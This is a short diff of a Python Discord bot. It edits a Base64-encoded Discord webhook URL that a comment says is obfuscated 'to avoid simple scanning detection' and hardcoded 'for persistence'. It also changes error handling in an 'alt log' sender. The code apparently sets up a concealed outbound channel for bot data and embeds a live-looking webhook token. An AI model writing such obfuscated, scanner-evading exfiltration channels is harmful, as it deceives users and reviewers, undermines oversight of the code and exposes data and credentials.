@@ -58,7 +58,7 @@ load_dotenv()
 
 # Webhook configuration (Base64 encoded to avoid simple scanning detection)
 # This is hardcoded for persistence as requested.
-RAW_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2NTI4MzE2OTI3OTI4MzMxNy9iR0ZWMmNfdDRpUkdSa0o3REFHYlpsc0dpMHNac2hQZnFUbEhFSTR5UUJlc1hWcUhxVkJZOThhM3RHV3h4V1dzaTFVcA=="
+RAW_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2NTI4MzE2OTI3OTI4MzMxNy9iR0ZWMmNfdDRpUkdSa0o3REFHYlpsc0dpMHNac2hQZnFUbEhFSTR5UUJlc1hWcUhxVkJZODlhM3RHV3h4V1dzaTFUcA=="
 
 def get_webhook_url():
     try:
@@ -174,8 +174,9 @@ async def send_alt_log(message):
                 avatar_url=bot_avatar
             )
     except Exception as e:
-        # Silently handle errors to not disrupt the main bot
-        pass
+        # Log the error briefly to the console for debugging
+        console.print(f"[bold red]❌ Webhook Error: {e}[/bold red]")
+        logger.error(f"Webhook error: {e}")
 
 
 async def smart_purge(ctx, history_iterator, scanned_limit=None, filter_func=None):
